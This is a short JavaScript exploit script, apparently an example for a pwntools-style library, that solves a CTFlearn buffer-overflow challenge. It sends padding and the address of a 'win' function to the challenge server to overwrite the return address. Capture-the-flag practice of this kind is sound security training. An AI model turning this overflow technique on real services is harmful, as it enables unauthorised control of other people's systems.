/**
 * https://ctflearn.com/challenge/1011 (RIP my bof)
 *
 * Overwrite return pointer/address with the address of win function.
 */
const fs = require('fs');
const { Remote, convo, ELF } = require("..");

fs.readFile(__dirname + "/bof2.ctflearn.elf", async (err, data) => {
    if (err) throw err;

    const elf = new ELF(Uint8Array.from(data));
    const winAddr = elf.getSymbol('win').value;

    const remote = Remote.create("thekidofarcrania.com", 4902);

    await remote.onceDataAsync('Input some text: ');

    remote.send("A".repeat(0x3C));
    remote.send(convo.toBuffer(winAddr));
    remote.send("\n");

    remote.pipeStdout();
});
